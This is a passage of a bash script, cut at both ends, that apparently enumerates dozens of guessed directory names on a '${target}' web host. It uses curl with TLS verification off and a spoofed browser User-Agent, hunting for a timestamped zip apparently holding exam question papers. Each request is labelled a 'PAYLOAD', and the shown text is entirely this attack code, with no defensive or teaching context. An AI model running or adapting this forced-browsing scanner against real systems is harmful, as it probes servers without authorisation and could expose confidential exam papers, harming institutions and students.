" "${target}WorkflowQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
